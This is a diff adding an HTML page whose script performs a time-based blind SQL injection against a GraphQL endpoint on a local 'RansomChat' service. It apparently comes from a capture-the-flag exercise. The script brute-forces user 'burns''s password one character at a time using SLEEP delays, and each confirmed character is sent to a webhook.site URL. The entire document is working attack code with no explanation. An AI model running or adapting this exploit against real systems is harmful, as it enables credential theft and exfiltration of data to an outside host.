@@ -1,0 +1,29 @@
+<html>
+    <body>
+        <script>
+        function inject(index, guess) {
+            var start = performance.now()
+            try {
+                var request = new XMLHttpRequest();
+                request.open('GET', `http://127.0.0.1:1337/graphql?query=query {RansomChat(enc_id:"1f81b076-fffc-45cd-b7c3-c686b73aa6af' AND IF(ASCII((SELECT SUBSTRING(password,${index},1) from users where username%3d'burns'))%3dASCII('${guess}'), SLEEP(4), 0)%3d'1"){id}}`, false);  // `false` makes the request synchronous
+                request.send(null);
+            } catch (error) {
+
+            }
+            var time = performance.now() - start;
+            if (time > 3000) {
+                fetch(`https://webhook.site/0446b15a-1f0d-4383-8eba-09e873ed2be6?success=true&index=${index}&guess=${guess}`);
+            }
+            return time
+        }
+        let possible = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}_';
+
+        for (let j = 1; j < 40; j++) {
+            for (let i = 0; i < possible.length; i++) {
+                let currentTry = possible.charAt(i);
+                inject(j, currentTry)
+            }
+        }
+        </script>
+    </body>
+</html>
